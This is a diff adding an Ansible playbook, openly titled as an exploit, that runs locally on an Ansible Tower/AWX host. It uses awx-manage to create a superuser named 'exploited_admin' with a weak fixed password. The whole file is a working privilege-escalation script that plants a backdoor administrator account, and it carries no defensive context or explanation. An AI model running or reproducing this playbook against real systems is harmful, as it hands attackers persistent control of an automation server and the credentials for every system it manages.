@@ -1,0 +1,43 @@
+---
+- name: exploit tower by creating our own admin user
+  hosts: localhost
+  connection: local
+  become: no
+  gather_facts: no
+
+
+  vars:
+    __admin_user  : exploited_admin
+    __admin_pass  : secret
+    __admin_email : exploits@somedomain.com
+
+
+  tasks:
+    - name: Find out who we are
+      command: whoami
+      register: r_whoami
+
+
+    - name: Show who we are
+      debug:
+        var: r_whoami.stdout
+
+
+    - name: awx-manage help
+      shell: "/usr/bin/awx-manage help"
+      delegate_to: localhost
+
+
+    - name: Create admin user
+      shell: "/usr/bin/awx-manage createsuperuser --username \
+                '{{ __admin_user }}' --email '{{ __admin_email }}' --noinput"
+      delegate_to: localhost
+
+
+    - name: Set admin user password
+      shell: "/usr/bin/awx-manage update_password --password \
+                '{{ __admin_pass }}' --username '{{ __admin_user }}'"
+      delegate_to: localhost
+
+...
+
